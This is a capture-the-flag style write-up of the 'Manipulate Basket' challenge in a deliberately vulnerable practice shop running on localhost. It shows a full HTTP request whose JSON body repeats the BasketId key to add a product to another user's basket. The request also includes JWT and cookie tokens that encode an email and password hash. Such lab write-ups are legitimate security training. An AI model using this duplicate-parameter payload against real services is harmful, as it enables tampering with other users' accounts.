# Manipulate Basket

**Difficulty**: :star2::star2::star2:

**Description**: Put an additional product into another user's shopping basket.

**Category**: Broken Access Control

**Tags**:

**Solution**:

After taking a peek a the solution guide, I found out that I can update the multiple baskets using a JSON object with duplicate entries:

<details>
<summary>Click to toggle contents of other `code`</summary>

```
POST /api/BasketItems/ HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wNy0yMSAxMzo1MjozOS40NjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0wNy0yMSAxNDoxODo1MS45MDEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjU4NDEzNjMyLCJleHAiOjE2NTg0MzE2MzJ9.J2gUOZULohN-bhTjQTfkhwJ2sKLUZcKhjpbImmmBkZ8BOt60LQQ-O9aEoXHD5nd9Qppz0k1cZMY1c2aZNp7e9VNHRpBuz4D62FH_jd3NsqMA2Li8u7oNBx4HguX7A_godqeUrVvJrQ_no9WkOXaUE9E97fZa4CEhQNyx1fYUF6Q
Connection: keep-alive
Content-Length: 90
Content-Type: application/json
Cookie: language=en; cookieconsent_status=dismiss; continueCode=WaVEx4lNDyYmdEytWswUEHLTofKi5OS98t2yiRkh77FM4t3Xdkrjw95LOqP2; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wNy0yMSAxMzo1MjozOS40NjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0wNy0yMSAxNDoxODo1MS45MDEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjU4NDEzNjMyLCJleHAiOjE2NTg0MzE2MzJ9.J2gUOZULohN-bhTjQTfkhwJ2sKLUZcKhjpbImmmBkZ8BOt60LQQ-O9aEoXHD5nd9Qppz0k1cZMY1c2aZNp7e9VNHRpBuz4D62FH_jd3NsqMA2Li8u7oNBx4HguX7A_godqeUrVvJrQ_no9WkOXaUE9E97fZa4CEhQNyx1fYUF6Q
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"

{
    "ProductId": 20,
    "BasketId": "6",
    "BasketId": "2",
    "quantity": 1
}
```

</details>

Result: I can successfully add an additional item to `BasketId: 2`

![result](https://user-images.githubusercontent.com/64480713/180245606-e46fafc0-9a28-45b4-a30c-18281ab74287.png)

